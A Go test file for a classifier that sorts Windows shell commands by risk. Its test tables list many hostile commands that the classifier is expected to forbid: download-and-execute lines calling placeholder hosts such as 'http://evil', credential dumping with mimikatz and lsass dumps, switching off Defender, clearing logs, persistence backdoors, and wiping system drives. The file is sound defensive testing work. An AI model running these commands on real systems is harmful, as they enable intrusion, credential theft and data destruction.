// rules_win_test.go 覆盖 CONTRACT.md 7.3B Windows 分册与验收项 G16：
// 危险命令（含绕过手法）forbidden、常规变更 needs_approval、只读 safe、
// 未知命令 needs_approval、-EncodedCommand 不解码直接 forbidden、双分册互不混用。
package risk

import (
	"strings"
	"testing"
)

// winCase 是 Windows 分册表驱动用例：wantRule 为空表示只断言级别。
type winCase struct {
	command   string
	wantLevel Level
	wantRule  string
}

func runWinCases(t *testing.T, cases []winCase) {
	t.Helper()
	for _, tc := range cases {
		d := Classify(tc.command, OSWindows)
		if d.Level != tc.wantLevel {
			t.Errorf("Classify(%q, windows).Level = %s (%s: %s), want %s; reasons=%v",
				tc.command, d.Level, d.RuleID, d.Reason, tc.wantLevel, d.Reasons)
			continue
		}
		if tc.wantRule != "" && d.RuleID != tc.wantRule {
			t.Errorf("Classify(%q, windows).RuleID = %s, want %s", tc.command, d.RuleID, tc.wantRule)
		}
	}
}

// TestWinForbiddenG16 覆盖契约 G16 验收清单与 7.3B forbidden 规则（含绕过手法）。
func TestWinForbiddenG16(t *testing.T) {
	runWinCases(t, []winCase{
		// G16 清单逐条。
		{"Remove-Item -Recurse -Force C:\\Windows", LevelForbidden, "WIN_RM_PROTECTED"},
		{"rm -Recurse -Force C:\\", LevelForbidden, "WIN_RM_PROTECTED"},
		{"rd /s /q C:\\", LevelForbidden, "WIN_RM_PROTECTED"},
		// Remove-Item 官方别名 ri/erase（评审发现：别名表曾误写不存在的
		// eri，导致系统盘递归删除从 forbidden 降级 needs_approval）。
		{"ri -r -fo C:\\Windows", LevelForbidden, "WIN_RM_PROTECTED"},
		{"erase -r -fo C:\\Windows", LevelForbidden, "WIN_RM_PROTECTED"},
		{"del /f /s /q C:\\Windows\\System32", LevelForbidden, "WIN_RM_PROTECTED"},
		{"format C:", LevelForbidden, "WIN_FORMAT"},
		{"vssadmin delete shadows /all", LevelForbidden, "WIN_FORMAT"},
		{"IEX(New-Object Net.WebClient).DownloadString('http://x')", LevelForbidden, "WIN_DOWNLOAD_EXEC"},
		{"powershell -enc AAAAQbbBccc", LevelForbidden, "WIN_ENCODED_EXEC"},
		{"powershell -EncodedCommand SQBFAFgA", LevelForbidden, "WIN_ENCODED_EXEC"},
		{"Set-MpPreference -DisableRealtimeMonitoring $true", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"procdump -ma lsass", LevelForbidden, "WIN_CRED_ACCESS"},
		{"reg save HKLM\\SAM sam.hive", LevelForbidden, "WIN_CRED_ACCESS"},
		{"mimikatz sekurlsa::logonpasswords", LevelForbidden, "WIN_CRED_ACCESS"},

		// 其余 forbidden 规则。
		{"Remove-Item -Recurse -Force D:\\", LevelForbidden, "WIN_RM_PROTECTED"},      // 任意盘根
		{"Remove-Item -Recurse -Force C:\\Wind*", LevelForbidden, "WIN_RM_PROTECTED"}, // glob 展开
		{"Remove-Item -Recurse -Force $dir", LevelForbidden, "WIN_RM_PROTECTED"},      // 未解析变量
		{"rm -Force -Recurse 'C:\\Program Files'", LevelForbidden, "WIN_RM_PROTECTED"},
		{"Format-Volume -DriveLetter D", LevelForbidden, "WIN_FORMAT"},
		{"Clear-Disk -Number 0", LevelForbidden, "WIN_FORMAT"},
		{"diskpart /s x.txt", LevelForbidden, "WIN_FORMAT"},
		{"cipher /w C:", LevelForbidden, "WIN_FORMAT"},
		{"bcdedit /set {default} recoveryenabled no", LevelForbidden, "WIN_FORMAT"},
		{"wbadmin delete catalog", LevelForbidden, "WIN_FORMAT"},
		{"Stop-Computer -Force", LevelForbidden, "WIN_POWER"},
		{"Restart-Computer", LevelForbidden, "WIN_POWER"},
		{"shutdown /r /t 0", LevelForbidden, "WIN_POWER"},
		{"Stop-Service WinRM", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"Stop-Service -Name sshd", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"Get-Service WinDefend | Stop-Service", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"}, // 管线目标
		{"net stop windefend", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"sc stop mpssvc", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"sc delete EventLog", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"Stop-Process -Name lsass", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"taskkill /f /im csrss.exe", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"Invoke-Command -ScriptBlock { Get-Process }", LevelForbidden, "WIN_REMOTE_EXEC"},
		{"Invoke-Command -ComputerName srv01 -ScriptBlock { dir }", LevelForbidden, "WIN_REMOTE_EXEC"},
		{"Enter-PSSession -ComputerName x", LevelForbidden, "WIN_REMOTE_EXEC"},
		{"New-PSSession -ComputerName x", LevelForbidden, "WIN_REMOTE_EXEC"},
		{"psexec \\\\srv01 cmd", LevelForbidden, "WIN_REMOTE_EXEC"},
		{"wmic /node:10.0.0.5 process call create 'cmd'", LevelForbidden, "WIN_REMOTE_EXEC"},
		{"Invoke-WmiMethod -ComputerName x -Path Win32_Process", LevelForbidden, "WIN_REMOTE_EXEC"},
		{"iwr http://x/p.ps1 | iex", LevelForbidden, "WIN_DOWNLOAD_EXEC"},
		{"curl http://x/p.ps1 | iex", LevelForbidden, "WIN_DOWNLOAD_EXEC"}, // curl 是 IWR 别名
		{"(New-Object Net.WebClient).DownloadFile('http://x', 'p.exe')", LevelForbidden, "WIN_DOWNLOAD_EXEC"},
		{"Invoke-RestMethod http://x | iex", LevelForbidden, "WIN_DOWNLOAD_EXEC"},
		{"certutil -urlcache -f http://x/p.exe p.exe", LevelForbidden, "WIN_DOWNLOAD_EXEC"},
		{"bitsadmin /transfer j http://x/p.exe C:\\p.exe", LevelForbidden, "WIN_DOWNLOAD_EXEC"},
		{"powershell -w hidden -c Get-Process", LevelForbidden, "WIN_ENCODED_EXEC"},
		{"powershell -windowstyle hidden -c whoami", LevelForbidden, "WIN_ENCODED_EXEC"},
		{"powershell -nop -exec bypass -c Get-Process", LevelForbidden, "WIN_ENCODED_EXEC"},
		{"powershell -Command [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('AAA'))", LevelForbidden, "WIN_ENCODED_EXEC"},
		{"certutil -decode payload.b64 payload.exe", LevelForbidden, "WIN_ENCODED_EXEC"},
		{"i`e`x Get-Process", LevelForbidden, "WIN_OBFUSCATION"},            // 反引号拼接标识符
		{"${e}xpression x", LevelForbidden, "WIN_OBFUSCATION"},              // ${} 变量切片构造命令名
		{"sal gz Get-Content; gz C:\\x", LevelForbidden, "WIN_OBFUSCATION"}, // set-alias 重命名
		{"$c='Get-Pr'+'ocess'; &$c", LevelForbidden, ""},                    // 变量拼接命令名
		{"rundll32 javascript:\\..\\..,x", LevelForbidden, "WIN_LOLBIN_EXEC"},
		{"regsvr32 /i:http://evil/x.sct scrobj.dll", LevelForbidden, "WIN_LOLBIN_EXEC"},
		{"mshta http://evil/x.hta", LevelForbidden, "WIN_LOLBIN_EXEC"},
		{"wscript C:\\x.vbs", LevelForbidden, "WIN_LOLBIN_EXEC"},
		{"msbuild C:\\x.csproj", LevelForbidden, "WIN_LOLBIN_EXEC"},
		{"forfiles /p C:\\ /c \"cmd /c evil.exe\"", LevelForbidden, "WIN_LOLBIN_EXEC"},
		{"at 22:00 cmd.exe", LevelForbidden, "WIN_LOLBIN_EXEC"},
		{"Invoke-Mimikatz -DumpCreds", LevelForbidden, "WIN_CRED_ACCESS"},
		{"rundll32 comsvcs.dll,MiniDump 123 dump.dmp full", LevelForbidden, "WIN_CRED_ACCESS"},
		{"ntdsutil \"ac i ntds\" q q", LevelForbidden, "WIN_CRED_ACCESS"},
		{"secretsdump.py -ntds ntds.dit system.hive", LevelForbidden, "WIN_CRED_ACCESS"},
		{"Add-MpPreference -ExclusionPath C:\\", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"Remove-MpPreference -ExclusionExtension .exe", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"wevtutil cl Security", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"Clear-EventLog System", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"fsutil usn deletejournal /D C:", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"Clear-History", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"Remove-Item (Get-PSReadlineOption).HistorySavePath", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"sc config WinDefend start= disabled", LevelForbidden, "WIN_DEFENSE_EVADE"},
		{"schtasks /create /tn x /tr c:\\evil.exe /sc daily", LevelForbidden, "WIN_PERSISTENCE"},
		{"Register-ScheduledTask -TaskName x -Action a", LevelForbidden, "WIN_PERSISTENCE"},
		{"New-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name backdoor -Value c:\\evil.exe", LevelForbidden, "WIN_PERSISTENCE"},
		{"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v b /d c:\\evil.exe", LevelForbidden, "WIN_PERSISTENCE"},
		{"Register-WmiEvent -Query x -Action y", LevelForbidden, "WIN_PERSISTENCE"},
		{"sc config evil binPath= c:\\evil.exe", LevelForbidden, "WIN_PERSISTENCE"},

		// 绕过手法：嵌套外壳包装（内部危险命令不因包装降级）。
		{"powershell -Command \"powershell -Command Remove-Item -Recurse C:\\Users\"", LevelForbidden, "WIN_RM_PROTECTED"},
		{"cmd /c rd /s /q C:\\Users", LevelForbidden, "WIN_RM_PROTECTED"},
		{"cmd /c \"net stop winrm\"", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
		{"powershell -Command Stop-Service -Name TermService", LevelForbidden, "WIN_CRITICAL_SERVICE_STOP"},
	})
}

// TestWinNeedsApproval 覆盖 needs_approval 规则与未知命令兜底。
func TestWinNeedsApproval(t *testing.T) {
	runWinCases(t, []winCase{
		// G16 清单。
		{"Stop-Service Spooler", LevelNeedsApproval, "WIN_SERVICE_CHANGE"},
		{"net user x /add", LevelNeedsApproval, "WIN_ACCOUNT_CHANGE"},
		{"New-NetFirewallRule -DisplayName test -Direction Inbound", LevelNeedsApproval, "WIN_FIREWALL_CHANGE"},
		{"totally-unknown-cmd --flag", LevelNeedsApproval, "WIN_DEFAULT_ASK"},

		// 其余变更类规则。
		{"Start-Service Spooler", LevelNeedsApproval, "WIN_SERVICE_CHANGE"},
		{"Restart-Service mpssvc-something", LevelNeedsApproval, "WIN_SERVICE_CHANGE"}, // 非关键名
		{"net start w3svc", LevelNeedsApproval, "WIN_SERVICE_CHANGE"},
		{"net localgroup administrators bob /add", LevelNeedsApproval, "WIN_ACCOUNT_CHANGE"},
		{"New-LocalUser svc -Password secret", LevelNeedsApproval, "WIN_ACCOUNT_CHANGE"},
		{"netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes", LevelNeedsApproval, "WIN_FIREWALL_CHANGE"},
		{"Set-NetFirewallProfile -Domain -Enabled False", LevelNeedsApproval, "WIN_FIREWALL_CHANGE"},
		{"Disable-NetAdapter 'Ethernet 1'", LevelNeedsApproval, "WIN_FIREWALL_CHANGE"},
		{"Set-DnsClientServerAddress -InterfaceAlias x -ServerAddresses 8.8.8.8", LevelNeedsApproval, "WIN_FIREWALL_CHANGE"},
		{"route add 10.0.0.0 mask 255.0.0.0 10.0.0.1", LevelNeedsApproval, "WIN_FIREWALL_CHANGE"},
		{"reg add HKLM\\SOFTWARE\\X /v y /d z", LevelNeedsApproval, "WIN_REG_WRITE"},
		{"reg delete HKLM\\SOFTWARE\\X /v y", LevelNeedsApproval, "WIN_REG_WRITE"},
		{"Set-ItemProperty HKLM:\\SOFTWARE\\X -Name y -Value 1", LevelNeedsApproval, "WIN_REG_WRITE"},
		{"Set-ExecutionPolicy Bypass", LevelNeedsApproval, "WIN_REG_WRITE"},
		{"Install-WindowsFeature Web-Server", LevelNeedsApproval, "WIN_SOFTWARE_CHANGE"},
		{"choco install git", LevelNeedsApproval, "WIN_SOFTWARE_CHANGE"},
		{"winget uninstall App.X", LevelNeedsApproval, "WIN_SOFTWARE_CHANGE"},
		{"msiexec /i pkg.msi", LevelNeedsApproval, "WIN_SOFTWARE_CHANGE"},
		{"dism /online /enable-feature /featurename:IIS", LevelNeedsApproval, "WIN_SOFTWARE_CHANGE"},
		{"Stop-Process -Name notepad", LevelNeedsApproval, "WIN_PROCESS_CONTROL"},
		{"taskkill /im notepad.exe", LevelNeedsApproval, "WIN_PROCESS_CONTROL"},
		{"Start-Process -Verb RunAs cmd", LevelNeedsApproval, "WIN_PROCESS_CONTROL"},
		{"Set-Content C:\\x.txt 'v'", LevelNeedsApproval, "WIN_FILE_WRITE"},
		{"Out-File C:\\x.txt", LevelNeedsApproval, "WIN_FILE_WRITE"},
		{"Copy-Item C:\\a C:\\b", LevelNeedsApproval, "WIN_FILE_WRITE"},
		{"New-Item -ItemType Directory C:\\tmp\\x", LevelNeedsApproval, "WIN_FILE_WRITE"},
		{"icacls C:\\x /grant Everyone:F", LevelNeedsApproval, "WIN_FILE_WRITE"},
		{"takeown /f C:\\x", LevelNeedsApproval, "WIN_FILE_WRITE"},
		{"attrib +h +s C:\\x", LevelNeedsApproval, "WIN_FILE_WRITE"},
		{"Remove-Item C:\\Temp\\cache -Recurse", LevelNeedsApproval, "WIN_RM_ANY"},
		{"del /f C:\\Temp\\x.log", LevelNeedsApproval, "WIN_RM_ANY"},
		{"rm C:\\Temp\\x -Force", LevelNeedsApproval, "WIN_RM_ANY"},
		{"Get-ChildItem Env:", LevelNeedsApproval, "WIN_ENV_DUMP"},
		{"Get-Content $env:USERPROFILE\\.aws\\credentials", LevelNeedsApproval, "WIN_ENV_DUMP"},
		{"Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0", LevelNeedsApproval, "WIN_RDP_CHANGE"},
		{"net localgroup \"Remote Desktop Users\" bob /add", LevelNeedsApproval, "WIN_ACCOUNT_CHANGE"},
		{"Get-Process > out.txt", LevelNeedsApproval, "WIN_FILE_WRITE"}, // 重定向=Out-File
		{"powershell -File C:\\setup.ps1", LevelNeedsApproval, "WIN_DEFAULT_ASK"},
		{"Get-Process $((Get-Date).Year)", LevelNeedsApproval, ""}, // 子表达式求值
	})
}

// TestWinSafe 覆盖 WIN_SAFE_READ / WIN_SAFE_PIPE / WIN_SAFE_FACTS。
func TestWinSafe(t *testing.T) {
	runWinCases(t, []winCase{
		{"Get-Service", LevelSafe, "WIN_SAFE_READ"},
		{"Get-Service Spooler", LevelSafe, "WIN_SAFE_READ"},
		{"dir C:\\Users", LevelSafe, "WIN_SAFE_READ"},
		{"ls C:\\inetpub", LevelSafe, "WIN_SAFE_READ"},
		{"systeminfo", LevelSafe, "WIN_SAFE_READ"},
		{"tasklist", LevelSafe, "WIN_SAFE_READ"},
		{"whoami", LevelSafe, "WIN_SAFE_READ"},
		{"ipconfig /all", LevelSafe, "WIN_SAFE_READ"},
		{"Get-CimInstance Win32_OperatingSystem", LevelSafe, "WIN_SAFE_READ"},
		{"Get-WmiObject Win32_Process", LevelSafe, "WIN_SAFE_READ"},
		{"Get-Process | Sort-Object CPU", LevelSafe, "WIN_SAFE_READ"},
		{"type C:\\x.txt", LevelSafe, "WIN_SAFE_READ"},
		{"ping 10.0.0.1", LevelSafe, "WIN_SAFE_READ"},
		{"quser", LevelSafe, "WIN_SAFE_READ"},
		{"Get-Process | Where-Object CPU -gt 1 | Format-Table", LevelSafe, "WIN_SAFE_READ"},

		// server_facts 固定模板（契约 7.5）：内部脚本与整条包装均精确放行。
		{WinFactsCommand, LevelSafe, "WIN_SAFE_FACTS"},
		{"powershell -NoProfile -NonInteractive -Command \"" + WinFactsCommand + "\"", LevelSafe, "WIN_SAFE_FACTS"},
	})
}

// TestWinFactsTemplateTamper 验证模板被改动后不再走 WIN_SAFE_FACTS。
func TestWinFactsTemplateTamper(t *testing.T) {
	tampered := WinFactsCommand + "; Remove-Item -Recurse -Force C:\\Windows"
	d := Classify(tampered, OSWindows)
	if d.Level != LevelForbidden {
		t.Fatalf("tampered facts template = %s (%s), want forbidden", d.Level, d.RuleID)
	}
	if d.RuleID == "WIN_SAFE_FACTS" {
		t.Fatal("tampered template must not match WIN_SAFE_FACTS")
	}
}

// TestWinInvalidInput 覆盖失败关闭输入（与 Linux 共用预检）。
func TestWinInvalidInput(t *testing.T) {
	for _, tc := range []struct {
		command  string
		wantRule string
	}{
		{"", "COMMAND_INVALID"},
		{strings.Repeat("A", MaxCommandBytes+1), "COMMAND_INVALID"},
		{"Get-\x00Process", "COMMAND_INVALID"},
		{"echo 'oops", "WIN_OBFUSCATION"},
		{"echo \"unclosed", "WIN_OBFUSCATION"},
		{"Get-Process }", "WIN_OBFUSCATION"},
	} {
		d := Classify(tc.command, OSWindows)
		if d.Level != LevelForbidden || d.RuleID != tc.wantRule {
			t.Errorf("Classify(%q, windows) = %s (%s), want forbidden %s", tc.command, d.Level, d.RuleID, tc.wantRule)
		}
	}
}

// TestWinOSIsolation 验证双分册互不混用（契约 7.3B）：Linux 规则在 Windows
// 目标不生效，反之亦然。
func TestWinOSIsolation(t *testing.T) {
	// Linux 危险命令在 Windows 分册按 PowerShell 语义重新判定（-rf 非法短
	// 选项合并，/ 是合法目标），不得沿用 Linux 的 RM_PROTECTED。
	d := Classify("rm -rf /", OSWindows)
	if d.Level == LevelForbidden && d.RuleID == "RM_PROTECTED" {
		t.Fatal("linux rule RM_PROTECTED must not fire on windows target")
	}
	if !strings.HasPrefix(d.RuleID, "WIN_") && d.RuleID != "COMMAND_INVALID" {
		t.Fatalf("windows decision must use WIN_ rules, got %s", d.RuleID)
	}
	// Windows 只读命令在 Linux 分册是未知命令（needs_approval），不 safe。
	if ld := Classify("Get-Service", OSLinux); ld.Level == LevelSafe {
		t.Fatalf("Get-Service on linux must not be safe, got %s (%s)", ld.Level, ld.RuleID)
	}
	if ld := Classify("systeminfo", OSLinux); ld.Level == LevelSafe {
		t.Fatalf("systeminfo on linux must not be safe, got %s (%s)", ld.Level, ld.RuleID)
	}
	// OS 缺省（空串）按 linux 处理。
	if got := Classify("rm -rf /", ""); got.RuleID != "RM_PROTECTED" {
		t.Fatalf("empty os must default to linux, got %s", got.RuleID)
	}
}

// TestWinEncodedCommandNeverDecoded 验证 -EncodedCommand 形式的变体一律
// 不解码直接 forbidden（契约 7.3B WIN_ENCODED_EXEC）。
func TestWinEncodedCommandNeverDecoded(t *testing.T) {
	for _, cmd := range []string{
		"powershell -EncodedCommand AAAA",
		"powershell -encodedcommand:AAAA",
		"pwsh -enc AAAA",
		"pwsh.exe -e AAAA",
		"powershell.exe -e:AAAA",
	} {
		d := Classify(cmd, OSWindows)
		if d.Level != LevelForbidden || d.RuleID != "WIN_ENCODED_EXEC" {
			t.Errorf("Classify(%q, windows) = %s (%s), want forbidden WIN_ENCODED_EXEC", cmd, d.Level, d.RuleID)
		}
	}
}

// TestWinNestingDepth 验证超深度嵌套失败关闭。
func TestWinNestingDepth(t *testing.T) {
	deep := "Get-Process"
	for i := 0; i < 6; i++ {
		deep = "$(" + deep + ")"
	}
	d := Classify(deep, OSWindows)
	if d.Level != LevelSafe {
		return // 非 safe 天然满足
	}
	t.Fatalf("deeply nested expression must not be safe: %+v", d)
}
